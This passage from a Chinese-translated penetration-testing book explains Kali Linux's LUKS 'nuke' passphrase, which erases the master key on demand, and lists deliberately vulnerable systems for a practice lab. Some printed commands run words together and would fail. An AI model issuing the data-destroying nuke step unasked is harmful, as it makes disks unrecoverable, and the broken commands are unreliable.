  \n在安装到硬盘或虚拟机的分区阶段，Kali 可以被设置为使用`逻辑卷管理`（`LVM`）和 `Linux 统一密钥设置`（`LUKS`）组合进行全盘加密，后者是\
  \ Linux 硬盘加密的标准应用程序。如下截图所示：\n\n**[316]**\n\n附\n\n![](img/index-334_1.png)\n\n访问加密驱动器需要密码口，建议密码口长度至少在\
  \ 20 个字符以上。遗憾的是，鉴于近期国家支持的监视出现，人们担心测试人员可能会被迫向政府特工交出密码口，从而消除加密的好处。\n\n解决方案是提供一个能够销毁（nuke）主密钥的密码口。这将确保机密性，使驱动器无法解密。这种功能最近添加到\
  \ Kali Linux 1.06 版本中。\n\nKali Linux 整合 `LUKS`，这是一种跨平台的加密规范，允许用户加密硬盘上的分区。`LUKS`\
  \ 允许使用多个用户密钥解密主密钥，允许多个用户加密和解密数据，并允许使用备份密钥。\n\n当创建一个 `LUKS` 加密容器时，会生成一个随机主密钥。该主密钥使用密码口进行加密。这种方法的优点是密码口并不直接关联数据——如果加密了两个相同的卷并使用了相同的密码口，主密钥仍然对各自的卷保持唯一且无法交换。\n\
  \n**[317]**\n\n*安装 Kali Linux*\n\n\n\n\n\n这意味着如果主密钥丢失或被破坏，将无法恢复加密数据。此属性允许我们在输入特定口令时，通过故意擦除主密钥，从而彻底销毁加密卷或硬盘的恢复能力。紧急自销毁功能已在\
  \ Kali Linux 1.06 版本中添加，可以使用 `cryptsetup` 工具实现。\n\n### 如何使用销毁（nuke）功能：\n\n1. 安装带有`Full\
  \ Disk Encryption`选项的 Kali。在安装 Kali 之前，所有分区将被擦除；这将导致安装过程变慢。\n\n2. 使用以下命令验证加密硬盘的\
  \ `LUKS` 头部信息：\n\n```\nroot@kali:~# cryptsetup luksDump /dev/sda5\n```\n\n`Key Slot\
  \ 0` 与磁盘加密密码关联并已启用。剩余的密钥槽均未使用。上一个命令的执行结果如下方的截图所示：\n\n![](img/index-335_1.png)\n\n\
  **[ 318 ]**\n\n*附录*\n\n3. 使用以下命令添加销毁密钥：\n\n```\nroot@kali:~# cryptsetup luksAddNuke\
  \ /dev/sda5\n```\n\n系统将提示你输入现有口令以验证身份，然后要求你输入用于销毁选项的新口令。请小心——它不会提示用户重复输入口令以防止输入时出现错误。上一个命令的执行结果如下方的截图所示：\n\
  \n![](img/index-336_1.png)\n\n4. 要确认销毁密钥已启用，请使用截图所示的命令查看可用密钥槽列表：\n\n![](img/index-336_2.png)\n\
  \n密钥槽 1 现在已启用；它包含销毁密钥。\n\n5. 使用以下命令备份密钥：\n\n```\nroot@kali:~# cryptsetupluksHeaderBackup\
  \ --header-backup-file <filename> /dev/sda5\n```\n\n**[ 319 ]**\n\n*安装 Kali Linux*\n\
  \n6. 一旦备份了主密钥文件，对其进行加密并传输到系统外进行安全存储。有多个应用程序可用于加密（例如 7 Zip、`bcrypt`、`ccrypt` 和 `GnuPG`），或者你也可以使用内部命令如\
  \ `openssl`。示例命令如下：\n\n```\nroot@kali:~# opensslenc -aes-256-cbc -salt -in <filename>\
  \ -out <encrypted filename.enc>\n```\n\n当备份文件安全后，你的系统将免受强制提取密码的威胁。如果输入了销毁密码，主密钥的本地副本将被删除，导致无法访问加密文件。\n\
  \n如果你在发出销毁密码后导出 `LUKS` 头部，你将看到如下方所示的输出：\n\n![](img/index-337_1.png)\n\n如果你想恢复一个被强制销毁的硬盘怎么办？只要你能从远程存储位置检索到加密头部，这都是简单的事；你将能够解密硬盘并恢复数据。一旦加密头部被解密（根据保护文件的方法使用相应的解密命令），输入以下命令：\n\
  \n```\nroot@kali:~# cryptsetupluksHeaderRestore --header-backup-file <filename>\
  \ /dev/sda5\n```\n\n**[ 320 ]**\n\n*附录*\n\n这将产生以下警告：\n\n`Device /dev/sda5 already\
  \ contains LUKS header, Replacing header will destroy existing keyslots. Are you\
  \ sure?`\n\n当收到提示时，输入 YES。这将替换头部并允许你解密硬盘。\n\n## 设置测试环境\n\n在测试生产环境之前，测试人员充分理解如何使用测试工具、这些工具对目标系统的影响，以及如何根据针对目标进行的活动解释数据至关重要。\n\
  \n由于某些原因，在受控环境中测试产生的结果与在生产系统上运行相同测试的结果不同，原因包括：\n\n* 目标环境的操作系统与测试环境的操作系统不同，包括不同的操作系统版本。（XP\
  \ 明显于 Windows 8.1，但 Windows 8.1 专业版与企业版之间、或 32 位与 64 位操作系统之间也存在差异。）支持本地语言的操作系统修改也对漏洞的存在产生重大影响。\n\
  * 目标环境应用了不同的服务包、补丁或升级。\n* 目标环境安装了不同的第三方应用程序；这些程序可能会与网络流量冲突，引入新的漏洞，或影响测试人员利用现有漏洞的能力。\n\
  * 在主机环境中配置为虚拟机的目标，其反应可能与直接安装在裸机上的目标系统不同。\n* 目标受到各种网络和系统设备及应用程序的保护。\n\n为了获得尽可能的结果，测试人员（以及攻击者）通常使用两个阶段的测试过程。测试人员首先使用定义良好的虚拟机（如\
  \ Windows XP）进行攻击，以确定最有效的攻击工具和方法；一旦这个简单的测试用例被证明，测试人员将使用更复杂的、尽可能镜像目标网络的虚拟或物理网络，对攻击进行重新验证。\n\
  \n**[ 321 ]**\n\n*安装 Kali Linux*\n\n### 存在漏洞的操作系统和应用程序\n\n测试人员通常维护一个当前和历史操作系统的库。在测试\
  \ Microsoft 操作系统时，使用 `WinXP` 作为测试漏洞的`参考标准`。尽管 Windows XP 将于 2014 年淘汰并不再受 Microsoft\
  \ 支持，但它仍然存在于许多网络的服务器和工作站中，并嵌入在打印机和终端等设备中。\n\n在测试漏洞操作系统时，订阅 `msdn.microsoft.com/en-ca/subscriptions/aa36858`\
  \ 对于获取当前的 Microsoft 产品进行测试非常有价值。\n\n不要使用从公共文件共享服务（如 Torrent 网站）下载的操作系统。Digital 最近评估了从\
  \ Torrent 下载的 40 个操作系统——每个下载都感染了后门，允许攻击者远程访问。\n\n为了测试具有特定漏洞的旧第三方 Windows 应用程序，测试人员可以访问保留旧应用程序版本的在线仓库；其中许多包含可利用的漏洞。此类仓库的示例可见于以下链接：\n\
  \n* `http://www.oldapps.com`\n* `www.oldversion.com`\n\n由于其开源特性，多个版本的 Unix 类操作系统（Linux、BSD\
  \ 和 Solaris）可供下载和测试。以下项目允许你测试已知漏洞的 Unix 操作系统安装，你可以访问：\n\n* `http://sourceforge.net/projects/virtualhacking/files/os/dvl/`\n\
  * `http://sourceforge.net/projects/lampsecurity/`\n* `http://sourceforge.net/projects/virtualhacking/files/os/metasitable2/`\n\
  \n**[ 322 ]**\n\n*附录*\n\n复杂的测试环境（操作系统和漏洞应用程序）可以从 VulnHub 仓库 http://vulnhub.com 下载。这些镜像通常带有指南，演示利用这些镜像的不同方法。部分镜像包括：\n\
  \n* **bWAPP**: 提供了多种破坏示例网站首页的方法\n* **VulnVPN**: 允许测试人员利用 VPN 服务访问服务器和内部服务，并获得 root\
  \ 权限\n* **VulnVoIP**: 允许测试人员练习侦察并允许利用 VoIP 网络\n\n\n\n\n最后，测试人员将希望利用一些可用于测试的漏洞 Web\
  \ 应用程序。\n\n最常见的测试目标之一是名为 `Metasploitable` 的 Linux 镜像。基础操作系统存在多个漏洞；此外，它在启动时会加载脆弱的\
  \ Web 应用程序。要访问这些应用程序，请将 `Metasploitable` 作为虚拟机启动，然后启动另一个运行 `Kali Linux` 的独立虚拟机。在\
  \ Kali 虚拟机中，打开浏览器并输入 `Metasploitable` 虚拟机的 IP 地址。你将看到如下所示所示菜单选项：\n\n![](img/index-340_1.png)\n\
  \n**[ 323 ]**\n\n### 安装 Kali Linux\n\nWeb 应用程序对于支持企业测试以及针对 Web 应用程序的特定攻击非常有帮助。这五个应用程序如下：\n\
  \n• **TWiki**: 这是一个在测试过程中支持企业协作的 wiki 应用；它使用结构化内容来创建简单的工作流系统。\n• **phpmyadmin**:\
  \ 允许通过 Web 远程管理 `MySQL` 数据库。\n• **webdav**: `HTTP` 协议的`基于 Web 的分布式授权与版本控制`扩展集，允许用户协作编辑和管理远程\
  \ Web 服务器上的文件。\n• **Mutillidae**: 一个由 `PHP` 脚本组成的漏洞 Web 攻击应用程序，易受到 `OWASP` 前 10\
  \ 漏洞的攻击。\n\n如你在下面的屏幕截图中所示，前 10 个漏洞可以在下拉菜单可用。例如，选择 `A2 - 跨站脚本 (XSS)` 选项将允许访问与特定漏洞类型匹配的子菜单（`Reflected`、`Persistent`、`DOM\
  \ Injection` 等）。\n\n![](img/index-341_1.jpg)\n\n**[ 324 ]**\n\n### 附录\n\n`Mutillidae`\
  \ 配置文件中指定的数据库是不正确的，你可能会在执行需要数据库访问的操作时收到多个错误。要修复这些问题，请登录 `Metasploitable2` 并编辑 `/var/www/mutillidae/config.inc`\
  \ 文件；将 `dbname` 字段从 `metasploit` 更改为 `owasp10`。\n\n• 最后，`Metasploitable` 框架启动 `Damn\
  \ Vulnerable Web Application (DVWA)`，它提供了一套不同的挑战来练习针对特定漏洞的攻击。\n\n![](img/index-342_1.png)\n\
  \n其他经过良好描述的漏洞 Web 应用程序还包括：\n\n• **Hackxor**: 这是一个 Web 应用程序攻击游戏，强制玩家通过故事来解决与各种漏洞相关的挑战（http://hackxor.sourceforge.net/cgi-bin/index.pl）。\n\
  • **Foundstone**: 它发布了一系列漏洞 Web 应用程序，包括银行、书店、赌场、物流和旅游网站（www.mcafee.com/us/downloads/free-tools/index.aspx）。\n\
  • **LAMPSecurity**: 它提供了一系列虚拟机，旨在教学 `Linux`、`Apache`、`PHP` 和数据库安全（http://sourceforge.net/projects/lampsecurity/files/）。\n\
  \n**[ 325 ]**\n\n### 安装 Kali Linux\n\n• **OWASP Broken Web Applications Project**:\
  \ 这是一个漏洞 Web 应用程序集合（http://code.google.com/p/owaspbwa/）。\n• **WebGoat**: 这是一个不安全的\
  \ `J2EE` Web 应用程序，试图提供真实的测试环境。它由 `OWASP` 维护（https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project）。\n\
  • **Web Security Dojo**: 由 `Maven Security` 发布的训练应用程序（https://www.mavensecurity.com/web_security_dojo/），包含多个目标镜像，包括\
  \ `Damn Vulnerable Web App`、`Google's Gruyere`、`Hackme's Casino`、`OWASP's Insecure\
  \ Web App` 和 `WebGoat`、`w3af's` 测试网站以及几个特定的漏洞目标。它还包含一个支持利用的工具 set。\n\n**[ 326 ]**\n\
